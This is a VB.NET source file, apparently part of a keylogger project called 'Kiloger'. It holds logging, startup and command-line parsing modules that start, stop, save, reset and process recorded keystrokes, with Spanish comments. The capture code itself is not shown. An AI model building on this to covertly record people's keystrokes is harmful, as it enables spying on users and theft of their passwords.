Module GlobalUses
    Public parameters As String
    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Zhenboro\Kiloger"
    Public alphabet As New ArrayList
End Module
Module Utility
    Public tlmContent As String
    Sub AddToLog(ByVal from As String, ByVal content As String, Optional ByVal flag As Boolean = False)
        Try
            Dim OverWrite As Boolean = False
            If My.Computer.FileSystem.FileExists(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log") Then
                OverWrite = True
            End If
            Dim finalContent As String = Nothing
            If flag = True Then
                finalContent = " [!!!]"
            End If
            Dim Message As String = DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & finalContent & " [" & from & "] " & content
            tlmContent = tlmContent & Message & vbCrLf
            Console.WriteLine("[" & from & "]" & finalContent & " " & content)
            Try
                My.Computer.FileSystem.WriteAllText(DIRCommons & "\" & My.Application.Info.AssemblyName & ".log", vbCrLf & Message, OverWrite)
            Catch
            End Try
        Catch ex As Exception
            Console.WriteLine("[AddToLog@Utility]Error: " & ex.Message)
        End Try
    End Sub
End Module
Module StartUp
    Sub Init()
        Try
            CommonActions()
            'Cargamos el alfabeto y numeros
            ApplyAlphabet()
        Catch ex As Exception
            AddToLog("Init@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub CommonActions()
        Try
            If Not My.Computer.FileSystem.DirectoryExists(DIRCommons) Then
                My.Computer.FileSystem.CreateDirectory(DIRCommons)
            End If
        Catch ex As Exception
            AddToLog("CommonActions@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ApplyAlphabet()
        Try
            alphabet.Clear()
            For Each item As Char In "abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ1234567890"
                alphabet.Add(item)
            Next
        Catch ex As Exception
            AddToLog("ApplyAlphabet@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
    Sub ReadParameters(ByVal parametros As String)
        Try
            If parametros <> Nothing Then
                Dim parameter As String = parametros
                If parameter.ToLower Like "*/startrecording*" Then
                    'Comienza a registrar teclas
                    Main.StartRecording()

                ElseIf parameter.ToLower Like "*/stoprecording*" Then
                    'Detiene el registrador de teclas
                    Main.StopRecording()

                ElseIf parameter.ToLower Like "*/saverecord*" Then
                    'envia el registro de teclas
                    Main.SaveRecord()

                ElseIf parameter.ToLower Like "*/resetrecord*" Then
                    'limpia el registro de teclas
                    Main.ResetRecord()

                ElseIf parameter.ToLower Like "*/saveandexit*" Then
                    'guarda y cierra
                    Main.SaveRecord()
                    Main.StopRecording()

                ElseIf parameter.ToLower Like "*/processkeys*" Then
                    'leer archivo y procesar teclas
                    Main.StartKeyProcessor(parameter.Split("'")(1))

                ElseIf parameter.ToLower Like "*/stop*" Then
                    'cierra
                    End

                End If
            End If
        Catch ex As Exception
            AddToLog("ReadParameters@StartUp", "Error: " & ex.Message, True)
        End Try
    End Sub
End Module